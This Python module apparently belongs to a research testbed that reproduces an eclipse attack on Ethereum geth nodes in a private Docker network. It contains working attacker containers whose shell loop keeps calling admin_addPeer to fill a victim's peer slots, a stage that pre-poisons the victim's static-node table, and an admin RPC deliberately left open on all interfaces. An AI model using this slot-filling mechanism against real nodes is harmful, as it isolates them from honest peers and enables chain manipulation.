"""`eclipse` profile adapter.

Stages of the eclipse attack reproduction (per the 2026 WWW paper, which
targets Geth v1.14.3; we run on whatever modern geth is on disk):

  * `normal`   — bootnode + 1 honest victim; baseline handshake verified.
                 Used to confirm the geth config layout (NoDiscovery /
                 BootstrapNodes=[] / StaticNodes=[...]) actually delivers
                 an RLPx handshake in our private 172.80.0.0/16 network.
  * `stage-a`  — bootnode + 1 victim + 1 attacker. Attacker dials victim
                 directly via StaticNodes. Verifies one attacker can occupy
                 one slot on the victim.
  * `stage-b`  — `stage-a` x N=8 attackers (concurrent dial).
  * `stage-c`  — `stage-a` x N=16+, demonstrating the slot-grab mechanism.
  * `stage-d`  — DB pre-filling: attackers send Ping to victim BEFORE
                 victim boots, so the victim's discovery table is poisoned
                 from the start.

Each stage uses a separate compose project (run_id-scoped) and never
mutates the upstream `Bunnyfinder/` artefact.

**Note on mining.** Modern geth (>=1.17) removed clique signing. We keep
the same PoS-pinged chain for every stage; this is a P2P-layer study, not
a mining study. The paper targets the PoS-era execution client and the
mining surface is irrelevant to slot-fill mechanisms.
"""
from __future__ import annotations
import json
import os
import secrets
import shutil
import time
from pathlib import Path
from typing import Any

from common import sh, append_event, file_sha256
from profiles.base import BaseAdapter
from prefix import PREFIX

CHAIN_ID = 32390
NETWORK_ID = 32390
BOOTNODE_IP = "172.80.1.10"
VICTIM_IP = "172.80.1.20"
ATTACKER_IP_BASE = "172.80.1.50"  # attackers start at .50 + i
ENODE_PORT = 30303
NODEKEY_CACHE = Path(__file__).resolve().parents[2] / "artifacts" / "eclipse-nodekey.json"
ATTACKER_KEY_CACHE_DIR = Path(__file__).resolve().parents[2] / "artifacts" / "eclipse-attacker-keys"

# Number of attacker containers for each scenario (overridable via env)
DEFAULT_ATTACKER_COUNT = {
    "stage-a": 1,
    "stage-b": 8,
    "stage-c": 16,
    "stage-d": 4,
}


def _docker_image_id(image: str) -> str:
    rc, out, _ = sh(["docker", "image", "inspect", image, "--format", "{{.Id}}"])
    return out.strip() if rc == 0 else ""


def _ensure_nodekey() -> tuple[str, str]:
    """Return (nodekey_hex, enode_pub_hex) for the bootnode.

    The enode URL we publish to honest nodes is
    `enode://<pub>@<BOOTNODE_IP>:30303`. Cached so every run uses the
    same identity, making the network deterministic.
    """
    if NODEKEY_CACHE.is_file():
        obj = json.loads(NODEKEY_CACHE.read_text())
        return obj["nodekey_hex"], obj["enode_pub_hex"]
    nodekey = secrets.token_hex(32)
    NODEKEY_CACHE.parent.mkdir(parents=True, exist_ok=True)
    name = f"erl-keygen-{secrets.token_hex(4)}"
    sh([
        "docker", "run", "-d", "--rm",
        "--name", name,
        "--entrypoint", "/bin/sh", "ethereum/client-go:latest",
        "-c",
        f"geth --dev --nodekeyhex {nodekey} --http --http.addr=0.0.0.0 "
        f"--http.port=8545 --http.api=admin,eth,net,web3 --ipcdisable "
        f"--port=30303 --maxpeers=0",
    ])
    enode_pub = None
    for _ in range(20):
        time.sleep(1)
        rc, out, _ = sh([
            "docker", "exec", name, "wget", "-qO-", "--timeout=2",
            "--post-data={\"jsonrpc\":\"2.0\",\"method\":\"admin_nodeInfo\","
            "\"params\":[],\"id\":1}",
            "--header=Content-Type: application/json",
            "http://127.0.0.1:8545",
        ])
        if rc == 0 and out.strip().startswith("{"):
            try:
                enode_pub = json.loads(out)["result"]["enode"].split("//", 1)[1].split("@", 1)[0]
                break
            except Exception:
                continue
    sh(["docker", "rm", "-f", name])
    if not enode_pub:
        raise RuntimeError("could not derive enode from nodekey")
    NODEKEY_CACHE.write_text(json.dumps({
        "nodekey_hex": nodekey,
        "enode_pub_hex": enode_pub,
    }, indent=2))
    return nodekey, enode_pub


def _enode_url(pub_hex: str, ip: str) -> str:
    return f"enode://{pub_hex}@{ip}:{ENODE_PORT}"


def _derive_enode_for(nodekey_hex: str, ip: str) -> str:
    """Boot a throwaway geth with the given nodekey, query admin_nodeInfo,
    rewrite the IP, return the enode URL."""
    name = f"erl-keygen-{secrets.token_hex(4)}"
    sh([
        "docker", "run", "-d", "--rm",
        "--name", name,
        "--entrypoint", "/bin/sh", "ethereum/client-go:latest",
        "-c",
        f"geth --dev --nodekeyhex {nodekey_hex} --http --http.addr=0.0.0.0 "
        f"--http.port=8545 --http.api=admin,eth,net,web3 --ipcdisable "
        f"--port=30303 --maxpeers=0",
    ])
    enode_pub = None
    for _ in range(15):
        time.sleep(1)
        rc, out, _ = sh([
            "docker", "exec", name, "wget", "-qO-", "--timeout=2",
            "--post-data={\"jsonrpc\":\"2.0\",\"method\":\"admin_nodeInfo\","
            "\"params\":[],\"id\":1}",
            "--header=Content-Type: application/json",
            "http://127.0.0.1:8545",
        ])
        if rc == 0 and out.strip().startswith("{"):
            try:
                enode_pub = json.loads(out)["result"]["enode"].split("//", 1)[1].split("@", 1)[0]
                break
            except Exception:
                continue
    sh(["docker", "rm", "-f", name])
    if not enode_pub:
        raise RuntimeError(f"could not derive enode for nodekey {nodekey_hex[:8]}")
    return f"enode://{enode_pub}@{ip}:{ENODE_PORT}"


def _ensure_attacker_keys(n: int) -> list[dict[str, str]]:
    """Return a list of {nodekey_hex, enode_url, ip} for n attackers.

    Cached at ATTACKER_KEY_CACHE_DIR/keys.json so repeated runs reuse
    the same attacker identities.
    """
    cache = ATTACKER_KEY_CACHE_DIR / "keys.json"
    if cache.is_file():
        existing = json.loads(cache.read_text())
        if len(existing) >= n:
            return existing[:n]
    out = []
    for i in range(n):
        ip = f"172.80.1.{50 + i}"
        nodekey = secrets.token_hex(32)
        enode_url = _derive_enode_for(nodekey, ip)
        out.append({"nodekey_hex": nodekey, "enode_url": enode_url, "ip": ip})
    ATTACKER_KEY_CACHE_DIR.mkdir(parents=True, exist_ok=True)
    cache.write_text(json.dumps(out, indent=2))
    return out


def _genesis(work: Path) -> Path:
    """Write the PoS-pinged genesis (modern geth refuses pure clique)."""
    signer = "0x7e5f4552091a69125d5dfcb7b8c2658029395bdf"
    alloc = {
        "0x" + "0" * 40: {"balance": "0x0"},
        signer: {"balance": "0x200000000000000000000000000000000000000000000"},
    }
    genesis = {
        "config": {
            "chainId": CHAIN_ID,
            "homesteadBlock": 0, "eip150Block": 0, "eip155Block": 0,
            "eip158Block": 0, "byzantiumBlock": 0,
            "constantinopleBlock": 0, "petersburgBlock": 0,
            "istanbulBlock": 0, "berlinBlock": 0, "londonBlock": 0,
            "shanghaiTime": 0,
            "terminalTotalDifficulty": 0,
            "clique": {"period": 5, "epoch": 30000},
        },
        "nonce": "0x0000000000000042", "timestamp": "0x0",
        "extraData": (
            "0x0000000000000000000000000000000000000000000000000000000000000000"
            f"{signer[2:].rjust(64, '0')}"
            "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        ),
        "gasLimit": "0x1c9c380", "difficulty": "0x400000000",
        "mixHash": "0x" + "0" * 64, "coinbase": "0x" + "0" * 40,
        "alloc": alloc, "number": "0x0", "gasUsed": "0x0",
        "parentHash": "0x" + "0" * 64,
    }
    p = work / "genesis.json"
    p.write_text(json.dumps(genesis, indent=2))
    return p


# Common config: geth 1.17+ needs [Node.P2P] for discovery / static / maxpeers.
def _config_block(node_maxpeers: int, static_enodes: list[str]) -> str:
    static_lines = ",\n".join(f'    "{e}"' for e in static_enodes)
    static_section = f"StaticNodes = [\n{static_lines}\n  ]" if static_enodes else "StaticNodes = []"
    return (
        "[Node]\n"
        "DataDir = \"/data\"\n"
        "HTTPHost = \"0.0.0.0\"\n"
        "HTTPPort = 8545\n"
        "HTTPVirtualHosts = [\"*\"]\n"
        "HTTPModules = [\"eth\",\"net\",\"web3\",\"admin\"]\n"
        "WSHost = \"0.0.0.0\"\n"
        "WSPort = 8546\n"
        "[Node.P2P]\n"
        f"MaxPeers = {node_maxpeers}\n"
        "NoDiscovery = true\n"
        "DiscoveryV4 = false\n"
        "DiscoveryV5 = false\n"
        "BootstrapNodes = []\n"
        "BootstrapNodesV5 = []\n"
        f"{static_section}\n"
    )


def _write_script(path: Path, network_id: int, nodekey: str, config: str,
                  extra_args: str = "") -> None:
    path.write_text(
        "#!/bin/sh\nset -eu\n"
        "geth init --datadir=/data /genesis.json\n"
        "cat > /data/geth.toml <<'EOF'\n"
        f"{config}"
        "EOF\n"
        "exec geth "
        f"--networkid={network_id} "
        f"--nodekeyhex={nodekey} --datadir=/data "
        "--config=/data/geth.toml "
        "--verbosity=4 "
        "--ipcdisable --port=30303 "
        f"{extra_args}\n"
    )
    path.chmod(0o755)


def _write_attacker_script(path: Path, network_id: int, nodekey: str,
                           config: str) -> None:
    """Attacker entrypoint: two stages.

    Stage 1: start geth in the background (writes PID to /tmp/geth.pid).
    Stage 2: hand off to dial_victim.sh, which blocks until geth's
    admin RPC is up on 127.0.0.1:8545 and then continuously calls
    admin_addPeer(victim_enode).

    The two-stage design is required because the dial loop needs a
    running geth, but the dial loop itself must not be a foreground
    process (otherwise geth never starts).
    """
    path.write_text(
        "#!/bin/sh\nset -eu\n"
        "geth init --datadir=/data /genesis.json\n"
        "cat > /data/geth.toml <<'EOF'\n"
        f"{config}"
        "EOF\n"
        # Stage 1: launch geth in background, log to /data/geth.log
        "nohup geth "
        f"--networkid={network_id} "
        f"--nodekeyhex={nodekey} --datadir=/data "
        "--config=/data/geth.toml "
        "--verbosity=4 "
        "--ipcdisable --port=30303 "
        "> /data/geth.log 2>&1 &\n"
        "GETH_PID=$!\n"
        "echo \"geth pid=$GETH_PID\"\n"
        # Wait for HTTP to come up before dialing
        "for i in $(seq 1 60); do\n"
        "  if wget -qO- --timeout=1 http://127.0.0.1:8545 "
        "--post-data='{\"jsonrpc\":\"2.0\",\"method\":\"net_peerCount\","
        "\"params\":[],\"id\":1}' "
        "--header='Content-Type: application/json' >/dev/null 2>&1; then\n"
        "    break\n"
        "  fi\n"
        "  sleep 1\n"
        "done\n"
        # Stage 2: hand off to dial_victim.sh (blocks forever)
        "exec /scripts/dial.sh\n"
    )
    path.chmod(0o755)


class Adapter(BaseAdapter):
    profile = "eclipse"

    SUPPORTED_SCENARIOS = ("normal", "stage-a", "stage-b", "stage-c", "stage-d")

    def meta(self) -> dict[str, Any]:
        return {
            "profile": self.profile,
            "scenario": self.scenario,
            "chain_id": CHAIN_ID,
            "images": {"el": "ethereum/client-go:latest"},
            "image_digests": {"el": _docker_image_id("ethereum/client-go:latest")},
            "supported_scenarios": list(self.SUPPORTED_SCENARIOS),
            "attacker_count": DEFAULT_ATTACKER_COUNT.get(self.scenario, 0),
            "stage_notes": {
                "normal":   "bootnode + 1 victim, baseline handshake",
                "stage-a":  "bootnode + 1 victim + 1 attacker, attacker dials victim",
                "stage-b":  "bootnode + 1 victim + N attackers (concurrent dial)",
                "stage-c":  "bootnode + 1 victim + 16+ attackers, slot-fill target",
                "stage-d":  "bootnode + 1 victim + N pre-fillers (DB pre-fill)",
            }.get(self.scenario, "unknown"),
        }

    def prepare(self) -> dict[str, Any]:
        if self.scenario not in self.SUPPORTED_SCENARIOS:
            raise NotImplementedError(
                f"eclipse scenario={self.scenario!r} not supported; "
                f"choose from {self.SUPPORTED_SCENARIOS}"
            )

        work = self.run_dir / "eclipse"
        if work.exists():
            shutil.rmtree(work)
        work.mkdir(parents=True)

        nodekey_hex, bootpub_hex = _ensure_nodekey()
        bootnode_enode = _enode_url(bootpub_hex, BOOTNODE_IP)

        # Determine number of attackers for the scenario
        n_attackers = int(os.environ.get(
            "ECLIPSE_ATTACKERS", DEFAULT_ATTACKER_COUNT[self.scenario]
        ))

        # Pre-derive attacker keys (cached) so runs are deterministic
        attackers: list[dict[str, str]] = []
        if n_attackers > 0:
            attackers = _ensure_attacker_keys(n_attackers)
            append_event(self.run_dir, {
                "event_type": "eclipse.attacker_keys.ready",
                "n": len(attackers),
                "cache": str(ATTACKER_KEY_CACHE_DIR / "keys.json"),
            })

        genesis_path = _genesis(work)

        # Each attacker gets its own data dir
        for i in range(n_attackers):
            (work / f"data_atk{i}").mkdir()

        # Victim gets a higher MaxPeers (50, paper default) so the slot-fill
        # mechanism is observable.
        #
        # For stage-a/b/c the victim has NO StaticNodes and is reached
        # purely by attacker dials. For stage-d, the victim is BORN with
        # the attackers' enodes pre-installed in StaticNodes — i.e. the
        # DB pre-fill mechanism: at victim startup, its static-node
        # table is already poisoned with attacker entries, so the very
        # first "Looking for peers" tick dials them without any
        # discovery happening.
        victim_maxpeers = 50
        if self.scenario == "stage-d":
            victim_static = [a["enode_url"] for a in attackers]
        else:
            victim_static = []
        victim_config = _config_block(victim_maxpeers, static_enodes=victim_static)
        _write_script(work / "victim.sh", NETWORK_ID,
                      secrets.token_hex(32),  # victim ephemeral key
                      victim_config)
        (work / "data_victim").mkdir()

        # Bootnode keeps the historical geth config (StaticNodes = [victim
        # enode]? no — victim has no static, bootnode also no static). It
        # exists for topology realism: paper's experimental setup includes
        # a bootnode whose enode is the seed.
        boot_config = _config_block(50, static_enodes=[])
        _write_script(work / "bootnode.sh", NETWORK_ID, nodekey_hex, boot_config)
        (work / "data_bootnode").mkdir()

        # Attacker scripts: each attacker uses StaticNodes = [bootnode]
        # so it can find *some* peer at boot (admin API on 127.0.0.1).
        # The actual attack dial happens AFTER geth is up via the
        # dial_victim.sh helper loop, which runs as the entrypoint's
        # second stage.
        for i, atk in enumerate(attackers):
            attacker_config = _config_block(50, static_enodes=[bootnode_enode])
            _write_attacker_script(
                work / f"attacker{i}.sh",
                NETWORK_ID,
                atk["nodekey_hex"],
                attacker_config,
            )

        # Common dial loop — waits for geth to be up on 127.0.0.1:8545,
        # then continuously dials the victim (resolved via docker DNS).
        (work / "dial_victim.sh").write_text(
            "#!/bin/sh\n" + _attacker_dial_script("victim")
        )
        (work / "dial_victim.sh").chmod(0o755)

        compose_path = work / "docker-compose.yml"
        compose_path.write_text(self._compose(n_attackers))

        return {
            "compose_files": [compose_path],
            "wait_seconds": int(os.environ.get("ECLIPSE_WAIT", 60)),
            "needs_mysql": False,
            "extra_compose_first": False,
            "source_case": str(compose_path),
            "source_case_sha256": file_sha256(compose_path),
            "n_attackers": n_attackers,
            "victim_maxpeers": victim_maxpeers,
            "bootnode_enode": bootnode_enode,
            "attacker_enodes": [a["enode_url"] for a in attackers],
        }

    def _compose(self, n_attackers: int) -> str:
        """Render the docker-compose.yml.

        For stage-a/b/c, attackers start with `depends_on: victim: started`
        (or no ordering) and dial the victim via admin_addPeer.

        For stage-d, attackers need to be already up and connected to
        each other BEFORE the victim comes online. We use compose-level
        `depends_on: {victim: service_healthy}` and a short sleep so
        attackers get a head start. The victim also waits for the
        attackers' HTTP endpoints to come up before dialing them.
        """
        net = f"{PREFIX}eclipse-{self.run_dir.name}"
        work = self.run_dir / "eclipse"
        genesis_path = work / "genesis.json"

        attacker_services = []
        for i in range(n_attackers):
            ip = f"172.80.1.{50 + i}"
            # For stage-d we delay attacker startup so they are already
            # running when the victim joins. For a/b/c attackers can
            # start in parallel with the victim.
            if self.scenario == "stage-d":
                # attacker shell sleeps 10 s before launching geth so the
                # victim — when it finally starts — finds the attackers
                # already listening on their static IPs.
                attacker_cmd = "sleep 10 && exec /scripts/attacker.sh"
            else:
                attacker_cmd = "exec /scripts/attacker.sh"
            attacker_services.append(f"""\
  attacker{i}:
    image: ethereum/client-go:latest
    volumes:
      - {work.absolute()}/attacker{i}.sh:/scripts/attacker.sh:ro
      - {work.absolute()}/dial_victim.sh:/scripts/dial.sh:ro
      - {work.absolute()}/data_atk{i}:/data
      - {genesis_path.absolute()}:/genesis.json:ro
    entrypoint: ["/bin/sh", "-c", "{attacker_cmd}"]
    networks:
      {net}:
        ipv4_address: {ip}
""")

        attacker_block = "\n".join(attacker_services) if attacker_services else ""

        return f"""# Auto-generated by profiles/eclipse.py — do not edit by hand.
# Run id: {self.run_dir.name}
# Scenario: {self.scenario} (n_attackers={n_attackers})
networks:
  {net}:
    driver: bridge
    ipam:
      config:
        - subnet: 172.80.0.0/16

services:
  bootnode:
    image: ethereum/client-go:latest
    entrypoint: ["/scripts/bootnode.sh"]
    volumes:
      - {work.absolute()}/bootnode.sh:/scripts/bootnode.sh:ro
      - {work.absolute()}/data_bootnode:/data
      - {genesis_path.absolute()}:/genesis.json:ro
    networks:
      {net}:
        ipv4_address: {BOOTNODE_IP}

  victim:
    image: ethereum/client-go:latest
    depends_on: [bootnode]
    entrypoint: ["/scripts/victim.sh"]
    volumes:
      - {work.absolute()}/victim.sh:/scripts/victim.sh:ro
      - {work.absolute()}/data_victim:/data
      - {genesis_path.absolute()}:/genesis.json:ro
    networks:
      {net}:
        ipv4_address: {VICTIM_IP}

{attacker_block}
"""

    def run_actions(self, prepared: dict[str, Any]) -> dict[str, Any]:
        """Stage-a/b/c: nothing to schedule. The attackers' own
        entrypoint loops continuously to dial the victim.

        Stage-d: nothing scheduled here either, but the caller is
        expected to have arranged for attackers to PING the victim
        before it boots (handled in compose `depends_on` ordering).

        Returns a summary noting the stage.
        """
        actions = ["attackers_active_loop"]
        if self.scenario == "stage-d":
            actions.append("pre_fill_before_victim_boot")
        append_event(self.run_dir, {
            "event_type": "eclipse.actions.scheduled",
            "scenario": self.scenario,
            "n_attackers": prepared.get("n_attackers", 0),
            "actions": actions,
        })
        return {"actions_run": actions, "scenario": self.scenario,
                "n_attackers": prepared.get("n_attackers", 0)}


def _attacker_dial_script(victim_dns: str = "victim") -> str:
    """A shell snippet that runs inside the attacker container: waits for
    the victim's HTTP endpoint to come up, then uses geth's admin API to
    dial it. This is what makes the attacker active rather than passive.

    NOTE: geth reports its own enode with its `self.listenAddr` IP,
    which on the victim's container is 127.0.0.1 (loopback). Calling
    admin_addPeer with that enode makes the attacker dial itself
    (127.0.0.1 in the attacker's container namespace = the attacker
    itself). We therefore rewrite the @<ip> portion of the enode to
    point at the victim container's docker IP, which we resolve via
    getent hosts.
    """
    return r"""set -e
VICTIM_IP=$(getent hosts {VDNS} | awk '{print $1}' | head -1)
if [ -z "$VICTIM_IP" ]; then
  echo "attacker: cannot resolve {VDNS}" 1>&2
  exit 0
fi
# wait for victim HTTP
for i in $(seq 1 60); do
  if wget -qO- --timeout=1 http://$VICTIM_IP:8545 \
    --post-data='{"jsonrpc":"2.0","method":"net_peerCount","params":[],"id":1}' \
    --header='Content-Type: application/json' >/dev/null 2>&1; then
    break
  fi
  sleep 1
done
RAW=$(wget -qO- --timeout=2 http://$VICTIM_IP:8545 \
  --post-data='{"jsonrpc":"2.0","method":"admin_nodeInfo","params":[],"id":1}' \
  --header='Content-Type: application/json')
PUB=$(echo "$RAW" | sed -n 's/.*"enode":"enode:\/\/\([0-9a-f]\{128\}\)@[^"]*".*/\1/p')
if [ -z "$PUB" ]; then
  echo "attacker: failed to extract victim pub from: $RAW" 1>&2
  exit 0
fi
VICTIM_ENODE="enode://${PUB}@${VICTIM_IP}:30303"
echo "attacker: dialing $VICTIM_ENODE" 1>&2
# Keep dialing — admin_addPeer is persistent. The first successful addPeer
# marks the victim in StaticNodes and the next 'Looking for peers' tick
# (~30 s) dials it. We keep re-issuing every 5 s in case the victim gets
# disconnected.
while true; do
  RESP=$(wget -qO- --timeout=2 http://127.0.0.1:8545 \
    --post-data="{\"jsonrpc\":\"2.0\",\"method\":\"admin_addPeer\",\"params\":[\"$VICTIM_ENODE\"],\"id\":1}" \
    --header='Content-Type: application/json' 2>&1)
  echo "attacker: admin_addPeer -> $RESP" 1>&2
  sleep 5
done
""".replace("{VDNS}", victim_dns)